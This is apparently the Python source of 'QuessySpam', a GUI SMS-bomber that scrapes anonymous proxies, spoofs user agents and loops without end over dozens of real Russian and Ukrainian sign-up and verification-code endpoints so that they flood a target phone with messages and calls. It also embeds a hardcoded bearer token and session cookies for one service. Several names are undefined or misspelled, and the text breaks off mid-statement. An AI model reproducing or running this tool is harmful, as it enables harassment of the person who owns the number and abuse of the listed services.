import requests
import fake_useragent
import random
import os
import sys
import json
from tkinter import *
import threading
import time
import tkinter.scrolledtext as tkscrolled
from bs4 import BeautifulSoup
from tkinter import messagebox as mb

root = Tk()
root.title(u'QuessySpam')
root.iconbitmap("iconka.ico")
root.geometry('817x400')
root['bg'] = '#141414'
root.resizable(False, False)

mb.showinfo(title="QuessySpam", message="Good fucked phones!")

def apchhuy():
    while True:
        print('[+] Telegram Channel: t.me/quessyspam Contact: t.me/quessydev')

tututu1 = threading.Thread(target=apchhuy)
tututu1.start()

class Proxer:
    def __init__(self):
        self.proxies = []
        self.good = []
    def get_anonymous_proxies(self):
        url = 'https://free-proxy-list.net/anonymous-proxy.html'
        response = requests.get(url)
        try:
            soup = BeautifulSoup(response.content, 'html.parser')
            table = soup.find('table', {'id': 'proxylisttable'})
            for row in table.find('tbody').find_all('tr'):
                data = list(map(lambda x: x.text, row.find_all('td')))
                host = data[0]
                port = data[1]
                code = data[2].lower()
                country = data[3].lower()
                anonymous = data[4].lower() in ('anonymous', 'elite proxy')
                version = 'https' if data[6].lower() == 'yes' else 'http'

                self.proxies.append({'ip': host, 'port': port, 'code': code, 'country': country, 'anonymous': anonymous, 'version': version})
        except  Exception as e:
            raise e
    def get_goods_proxies(self):
        for temp in self.proxies:
            try:
                session = requests.Session()
                session.headers['User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36'
                session.max_redirects = 300
                session.get('https://google.com', proxies={temp['version']: temp['version'] + '://' + temp['ip'] + ':' + temp['port']},allow_redirects=True)
                self.good.append({temp['version']: temp['version'] + '://' + temp['ip'] + temp['port']})
            except:
                pass
    def proxy(self):
        self.get_anonymous_proxies()
        self.get_goods_proxies()
        return self.good

class SMSAttack:
    def __init__(self, _phone, proxy):
        self.ua = fake_useragent.UserAgent()
        if proxy == True:
            ogobebra = Proxer()
            self.proxy = ogobebra.proxy()
        else:
            self.proxy = [{'http': ''}, {'http': ''}]
        self._phone = _phone
    def start(self):
        _phone = self._phone
        if _phone[0] == '+':
            _phone = _phone[1:]
        if _phone[0] == '8':
            _phone = '7'+_phone[1:]
        if _phone[0] == '9':
            _phone = '7'+_phone
        
        _name = ''
        for x in range(12):
            _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        iteration = 0
        sms_amount = 0
        _phone9 = _phone[1:]
        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _email = _name+f'{iteration}'+'@gmail.com'
        email = _name+f'{iteration}'+'@gmail.com'
        request_timeout = 0.00001
        while True:
            try:
                requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Grab отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Prime отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Yandex.Chef')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')
                
            try:
                requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _name}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] EasyPAY отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://www.yaposhka.kh.ua/customer/account/createpost/', data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Yaposhka отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] finam отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://www.uklon.com.ua/api/v1/account/code/send',json={"phone": _phone}, headers={'User-Agent': self.ua.random, "client_id": "6289de851fc726f887af8d5d7a56c635"})
                logs.insert('insert', '\n[+] Uklon отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] Uklon не отправлено!')

            try:
                requests.post('https://www.uklon.com.ua/api/v1/account/code/send',json={"phone": _phone}, headers={'User-Agent': self.ua.random, "client_id": "6289de851fc726f887af8d5d7a56c635"})
                logs.insert('insert', '\n[+] Uklon отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] Uklon не отправлено!')

            try:
                requests.get('https://findclone.ru/register', params={"phone": "+" + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] FindClone отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 
                
            try:
                requests.post('https://fix-price.ru/ajax/register_phone_code.php', data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Fix-Price отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requets.post('https://guru.taxi/api/v1/driver/session/verify', json={"phone": {"code": 1, "number": _phone}}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] GURU отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 
            try:
                requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] SportMaster!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": name,"application": "lkp","login": "+" +_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Invitro отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 
                
            try:
                requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Iqos отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://app.karusel.ru/api/v1/phone/', data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Karusel отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={"phone": "+" + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Lenta отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://www.menu.ua/kiev/delivery/profile/show-verify.html', data={"phone": _phone, "do": "phone"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Menu отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://www.menu.ua/kiev/delivery/registration/direct-registration.html', data={"user_info[fullname]": name,"user_info[phone]": _phone,"user_info[email]": email,"user_info[password]": name,"user_info[conf_password]": name}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Menu2 отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://mobileplanet.ua/register', data={"klient_name": name,"klient_phone": "+" + _phone,"klient_email": email}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] mobileplanet отправлено!')
 
 
            except:
               logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://www.moyo.ua/identity/registration', data={"firstname": name,"phone": _phone,"email": email}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MOYO отправлено!')
 
 
            except:
               logs.insert('insert', '\n[-] error in sent!')
 
               
            try:
                requests.post('https://auth.multiplex.ua/login', json={"login": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MultiPlex отправлено!')
 
 
            except:
               logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://auth.multiplex.ua/login', json={"login": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MultiPlex отправлено!')
 
 
            except:
               logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://auth.multiplex.ua/login', json={"login": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MultiPlex отправлено!')
 
 
            except:
               logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://auth.multiplex.ua/login', json={"login": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MultiPlex отправлено!')
 
 
            except:
               logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://auth.multiplex.ua/login', json={"login": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MultiPlex отправлено!')
 
 
            except:
               logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://auth.multiplex.ua/login', json={"login": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MultiPlex отправлено!')
 
 
            except:
               logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', data={"st.r.phone": "+" +_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] OK отправлено!')
 
 
            except:
               logs.insert('insert', '\n[-] error in sent!')


            try:
                requests.post('https://www.ollis.ru/gql', json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Oliis отправлено!')
 
 
            except:
               logs.insert('insert', '\n[-] error in sent!')

            try:
                requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Online.ua отправлено!')
 
 
            except:
               logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requets.post('https://plink.tech/resend_activation_token/?via=call', json={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Plink отправлено!')
 
 
            except:
               logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://app.redmondeda.ru/api/v1/app/sendverificationcode', data={"phone": _phone}, headers={'User-Agent': self.ua.random, 'token': '.'})
                logs.insert('insert', '\n[+] REDmondeta отправлено!')
 
 
            except:
               logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://pay.visa.ru/api/Auth/code/request', json={"phoneNumber": "+" +_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Visa отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://api.iconjob.co/api/auth/verification_code', json={"phone":_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] iconjob отправлено!')
 
 
            except:
               logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy)).json()["res"]
                logs.insert('insert', '\n[+] RuTaxi sent!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] BelkaCar sent!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] StarPizzaCafe отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://mamamia.ua/api/auth/login', data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MamaMia отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://sushiwok.ua/user/phone/validate', data={"phone": "+" +_phone ,"captchaRegisterAnswer":false,"repeatCaptcha":false}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Sushiwok отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Tinder sent!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Karusel sent!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Tinkoff отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Dostavista отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32', data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] SportMaster отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://alfalife.cc/auth.php', data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Alfalife отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] KoronaPay отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://silpo.ua/graphql', data={"validateLoginInput":{"flowId":99322,"currentPlace":"_phone","nextStep":"auth-otp","__typename":"FlowResponse"}}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Silpo отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] BTfair отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on", "oferta": "on",}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] GGbet отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-]  не отправлено!')

            try:
                requests.post('https://www.etm.ru/cat/runprog.html', data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes",}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] ETM отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] TheLive отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MTS sent!')
 
 
            except:
                logs.insert('insert', '\n[-] error in sent!')
 

            try:
                requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MyGames sent!')
 
 
            except:
                logs.insert('insert', '\n[+] error in sent!')

            try:
                requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MyGames sent!')
 
 
            except:
                logs.insert('insert', '\n[+] error in sent!')

            try:
                requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MyGames sent!')
 
 
            except:
                logs.insert('insert', '\n[+] error in sent!')

            try:
                requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MyGames sent!')
 
 
            except:
                logs.insert('insert', '\n[+] error in sent!')

            try:
                requests.post('https://zoloto585.ru/api/bcard/reg/', json={"name": _name,"surname": _name,"patronymic": _name,"sex": "m","birthdate": "11.11.1999","phone": (_phone, "+* (***) ***-**-**"),"email": _email,"city": "Москва",}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Zoloto585 отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Kasta отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] Kasta Не отправлено!')

            try:
                requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Kasta отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] Kasta Не отправлено!')

            try:
                requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Kasta отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] Kasta Не отправлено!')

            try:
                requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Kasta отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] Kasta Не отправлено!')

            try:
                requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Kasta отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] Kasta Не отправлено!')

            try:
                requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Kasta отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] Kasta Не отправлено!')

            try:
                requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Kasta отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] Kasta Не отправлено!')

            try:
                requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Kasta отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] Kasta Не отправлено!')

            try:
                requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/', data={"RECALL": "Y", "BACK_CALL_PHONE": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Taxi-Ritm отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone":"+" + _phone, "api": 2,"email":"email", "x-email":"x-email",}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Mail.ru отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://api.creditter.ru/confirm/sms/send', json={"phone": (_phone, "+* (***) ***-**-**"),"type": "register",}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Creditter отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2', json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999),"FirstName": _name,"Gender": "M","LastName": _name,"SecondName": _name,"Phone": _phone,"Email": _email,}, headers={'User-Agent': self.ua.random, "Referer": "https://www.ingos.ru/cabinet/registration/personal"})
                logs.insert('insert', '\n[+] Ingos отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://win.1admiralxxx.ru/api/en/register.json', json={"mobile": _phone,"bonus": "signup","agreement": 1,"currency": "RUB","submit": 1,"email": "","lang": "en",}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Admiralxxx отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Av отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MTS отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] City24 отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] SushiMaster отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://auth.multiplex.ua/login', json={"login": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] MultiPlex отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] 3040 отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://www.niyama.ru/ajax/sendSMS.php', data={"REGISTER[PERSONAL_PHONE]": _phone,"code":"", "sendsms":"Выслать код",}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Niyama отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] Niyama не отправлено!')

            try:
                requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] VSK отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] VSK не отправлено!')

            try:
                requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] EasyPay отправлено!')
 
 
            except:
                logs.insert('insert', '\n[-] не отправлено!')

            try:
                requests.post('https://cabinet.planetakino.ua/service/sms', data={"phone": _phone})
                logs.insert('insert', '\n[+] planetakino отправлено!')
            except:
                logs.insert('insert', '\n[-] не отправлено!')
            try:
                data_frisor={"phone": _phone}
                frisor={
                    'Content-type': 'application/json',
                    'Accept': 'application/json, text/plain',
                    'authorization': 'Bearer yusw3yeu6hrr4r9j3gw6',
                    'user-agent': self.ua.random,
                    'cookie': 'auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1'
                    }
                requests.post("https://n13423.yclients.com/api/v1/book_code/312054", data=json.dumps(data_frisor), headers=frisor)
                # 1 раз в минуту
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://kasta.ua/api/v2/login/", data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://izi.ua/api/auth/register", json={"phone": _phone9, "name": "Олег", "is_terms_accepted": "true"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://junker.kiev.ua/postmaster.php", data={
                'tel': junker_phone,'name': _name,'action':'callme',
                }, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post("https://youla.ru/web-api/auth/request_code", data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
                requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                requests.post(f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone9}", headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', "\n[+] Запрос отправлен!")
            except:
                logs.insert('insert', "\n[-] Запрос не отправлен!")
            try:
